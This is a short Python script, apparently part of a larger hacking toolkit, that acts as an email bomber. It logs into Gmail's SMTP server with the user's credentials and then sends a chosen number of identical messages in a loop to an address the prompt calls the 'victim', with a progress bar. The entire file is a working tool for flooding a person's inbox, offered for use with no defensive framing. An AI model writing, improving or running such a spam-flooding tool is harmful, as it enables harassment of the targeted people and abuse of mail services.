from smtplib import *
import social2
import smtplib
import os
import colorama
import time
import progressbar
from colorama import Back,Fore,Style
colorama.init()
def main():
 email=input("Enter your email:")
 password=input("Enter your password from email:")
 vi=input("Enter vicim's mail:")
 number=int(input("Enter number of massages:"))
 message=input("Enter your masssage:")
 login(email,password)
 send(email,vi,message,number)
def login(e,p):
 global server
 try:
  server=smtplib.SMTP('smtp.gmail.com',587)
  print(Fore.GREEN+"Connected to SMTP server"+Fore.RESET)
 except SMTPConnectError:
  print(Fore.RED+"Error with connection!"+Fore.RESET)
  social2.check_back('spam')
 server.starttls()
 try:
  server.login(e,p)
  print (Fore.GREEN+"Login Succsessful"+Fore.RESET)
 except SMTPAuthenticationError:
  print (Fore.RED+"Wrong password or email!"+Fore.RESET)
  time.sleep(0.2)
  social2.check_back("spam")
def send(e,v,m,n):
 bar = progressbar.ProgressBar(maxval=n, widgets=[Fore.RESET+'Emails sending:',progressbar.Bar(left='[', marker=Fore.GREEN+'#', right=']'),]).start() 
 for f in range(n):
  try:
   server.sendmail(e,v,m)
   bar.update(f)
   time.sleep(0.05)
  except Exception:
   print (Fore.RED+"Error(SMTPSenderRefused)"+Fore.RESET) 
 bar.finish()
 print(Fore.GREEN+"All emails sended!"+Fore.RESET)
 social2.check_back('spam')
